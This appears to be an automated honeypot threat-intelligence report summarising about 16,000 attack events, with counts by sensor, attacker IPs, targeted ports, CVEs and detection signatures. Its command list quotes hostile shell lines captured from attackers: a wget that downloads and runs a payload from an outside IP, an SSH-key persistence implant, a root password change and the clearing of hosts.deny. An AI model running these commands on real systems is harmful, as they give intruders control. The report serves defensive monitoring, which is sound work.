
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-21T20:01:41Z
**Timeframe:** 2025-10-21T19:20:01Z to 2025-10-21T20:00:01Z
**Files Used:**
- agg_log_20251021T192001Z.json
- agg_log_20251021T194001Z.json
- agg_log_20251021T200001Z.json

## Executive Summary

This report summarizes 15,984 malicious events recorded across three honeypot log files. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute-force attempts. A significant number of attacks were also detected by Suricata and Honeytrap. The most prominent attack vector observed was related to the DoublePulsar backdoor, with over 1,600 events. There is also evidence of attackers attempting to install SSH keys for persistence and downloading malicious shell scripts.

## Detailed Analysis

### Attacks by Honeypot

*   **Cowrie:** 6,107
*   **Honeytrap:** 4,266
*   **Suricata:** 3,495
*   **Ciscoasa:** 1,542
*   **Sentrypeer:** 163
*   **Tanner:** 103
*   **Dionaea:** 92
*   **Mailoney:** 92
*   **ConPot:** 51
*   **H0neytr4p:** 29
*   **ElasticPot:** 16
*   **Adbhoney:** 15
*   **Dicompot:** 4
*   **Ipphoney:** 3
*   **Honeyaml:** 3
*   **Heralding:** 3

### Top Attacking IPs

*   102.91.4.218
*   138.197.43.50
*   51.89.1.85
*   72.146.232.13
*   178.128.232.91
*   107.170.36.5
*   88.210.63.16
*   142.93.214.157
*   202.155.141.22
*   36.50.54.8

### Top Targeted Ports/Protocols

*   TCP/445
*   22
*   5903
*   5060
*   8333
*   5901
*   80
*   25
*   23
*   TCP/80

### Most Common CVEs

*   CVE-2002-0013 CVE-2002-0012
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
*   CVE-2021-3449 CVE-2021-3449
*   CVE-2019-11500 CVE-2019-11500
*   CVE-2024-4577 CVE-2002-0953
*   CVE-2024-4577 CVE-2024-4577
*   CVE-2001-0414
*   CVE-2005-4050
*   CVE-2018-11776
*   CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773
*   CVE-2021-42013 CVE-2021-42013

### Commands Attempted by Attackers

*   `uname -s -v -n -r -m`
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `echo "root:8fkQtGi6QJqb"|chpasswd|bash`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
*   `rm .s; wget http://89.148.130.168:25840/.i; chmod 777 .i; ./.i; exit`
*   `tftp; wget; /bin/busybox JGYJC`
*   `system`
*   `shell`

### Signatures Triggered

*   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
*   ET DROP Dshield Block Listed Source group 1
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET SCAN NMAP -sS window 1024
*   ET HUNTING RDP Authentication Bypass Attempt
*   ET INFO Reserved Internal IP Traffic
*   ET CINS Active Threat Intelligence Poor Reputation IP group 42
*   ET CINS Active Threat Intelligence Poor Reputation IP group 43
*   ET CINS Active Threat Intelligence Poor Reputation IP group 49
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 28

### Users / Login Attempts

A wide variety of usernames and passwords were attempted, with a focus on default credentials for services like SSH, Telnet, and various databases. Common usernames included `root`, `user`, `admin`, `postgres`, `oracle`, `git`, and `pi`. Passwords ranged from simple combinations like `123456` to more complex default passwords.

### Files Uploaded/Downloaded

*   sh
*   wget.sh;
*   .i;
*   w.sh;
*   c.sh;

### HTTP User-Agents

*   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36/Accept: */*

### SSH Clients and Servers

No specific SSH client or server information was available in the logs.

### Top Attacker AS Organizations

No attacker AS organization data was available in the logs.

## Key Observations and Anomalies

*   The high number of events related to the DoublePulsar backdoor suggests ongoing automated exploitation attempts for this vulnerability.
*   Attackers are consistently attempting to download and execute shell scripts (`.sh` files), indicating a common tactic for deploying malware or establishing a foothold.
*   The commands observed show a clear pattern of reconnaissance (`uname`, `lscpu`), attempting to disable security (`chattr`), and establishing persistence (adding SSH keys).
*   The variety of honeypots that were triggered indicates a broad spectrum of scanning and exploitation attempts against many different services.
